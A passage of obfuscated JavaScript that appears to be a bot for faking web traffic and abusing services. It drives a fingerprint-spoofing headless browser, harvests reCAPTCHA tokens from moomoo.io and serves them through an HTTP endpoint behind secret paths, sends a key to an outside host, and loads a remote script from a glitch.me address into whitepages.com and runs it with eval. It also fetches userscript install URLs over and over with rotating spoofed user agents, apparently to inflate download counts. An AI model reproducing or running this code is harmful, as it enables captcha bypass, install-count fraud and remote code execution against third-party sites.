      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': X(0xd, '010j') + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x24d6 + -0xb56 + -0x1980
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1 * -0x23fb + -0x59c * -0x6 + -0x1 * 0x45a3)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0xcfe * -0x2 + -0x160b + -0x38d), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x41 * 0x2 + -0x23af + 0x2391), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0xc43 * -0x3 + 0xc2f * 0x2 + -0x11 * -0xbb;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x131 * 0xd + 0xef0 * 0x1 + 0x1 * 0x8d; w < getRandomInt(-0x1a22 + -0x1e5 * 0xb + 0x2efa, 0x6b2 * -0x3 + -0x1a9e + 0xf93 * 0x3); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x2 * 0x4f3a + 0x29d0 + 0xec * 0x25);
        }
      }();
    }, -0x3 * -0x11f + 0x1 * 0x7bd + -0xab6 * 0x1), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0xa * -0x313 + -0x244f + -0xf * -0x5f;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x1fa8 + -0x1e86 + 0x122 * -0x1, -0x149 + -0x983 + 0xafe)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x2 * -0x1153 + -0xaa89 + -0x67 * -0x275);
    }, -0x1e07 * -0x1 + -0xad6 + -0x12cd), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const Y = b;
        try {
          let s = 0x52 * 0x35 + 0xfb6 + 0x4 * -0x82c;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x1 * 0x6c5 + -0x24d5 * -0x1 + 0x1fe2 * -0x1), await u[Y(0xb, 'sxSu')](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0xd * -0x1a7 + -0x5 * 0x514 + 0x1 * 0x2edf), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0xb7ecf * 0x1 + 0x1 * 0x109c5b + -0xe5f8a);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x11d1 * -0x1 + 0x92 * 0x1 + 0x1 * -0x11ff);
  })()), doFlags['doCreateSe' + X(0x11, '!akP')]) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const Z = c,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x434 + -0x524 + 0x1b8);
    const j = Z(0x6) + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x1c7e * -0x2 + -0x21 * -0x163 + 0x9 * 0x4c1);
}
doFlags['doOUJS'] && ((async () => {
  const a2 = c,
    a1 = b,
    a0 = d;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0xe46 + 0x54d + 0x8fa) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0xe79 + 0x1 * -0x3e0 + -0xa98));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1e4a + 0x229a + -0x450, D['indexOf']('\x20'));
        return B ? E['slice'](0x16cb + 0x6 * -0x1ee + -0xb37, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x4af2 + -0x1 * -0x4239 + 0x2fc9),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x1 * 0x2821 + 0x47ed + 0x744),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a0(0xf) + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + a1(0xa, '@[AP') + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + a2(0x8) + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1033 + 0xae6 + 0x54d * 0x1; k < 0xf4e + -0x20b3 + -0x1169 * -0x1; k++)
    setTimeout(f, (0x65b3 + -0x7fc * -0xe + 0x14e5) * k * getRandomInt(0x9a8 + -0x1b7b + -0x475 * -0x4, -0xe7 * 0x15 + 0xb24 + -0x11e * -0x7));
  setInterval(() => {
    f();
    for (let l = 0x1b49 + 0x1e5b + -0x39a4; l < -0x1d17 + 0x5f0 + 0x1 * 0x172b; l++)
      setTimeout(f, (-0x16714 + -0x1adad + -0x5d03 * -0xb) * l * getRandomInt(-0x1307 + -0x46e + -0x2a * -0x8f, -0x1dbc * -0x1 + 0x672 * 0x4 + -0x3781));
  }, 0x48172f + 0x1 * -0x4b772 + -0xc713d);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
